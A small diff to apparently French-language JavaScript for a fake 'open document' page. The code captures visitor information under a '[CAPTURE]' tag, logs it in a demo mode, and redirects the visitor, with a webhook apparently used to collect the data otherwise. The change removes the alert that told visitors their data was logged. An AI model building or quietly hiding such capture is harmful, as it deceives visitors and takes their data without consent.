@@ -299,7 +299,6 @@ function ouvrirDocument() {
     // Mode démo : si WEBHOOK_URL est vide, on log en console au lieu d'envoyer
     if (!WEBHOOK_URL) {
       console.log('[CAPTURE]', JSON.stringify(infos, null, 2));
-      alert('Mode démo — données loggées en console (F12).');
       window.location.href = REDIRECT_URL;
       return;
     }
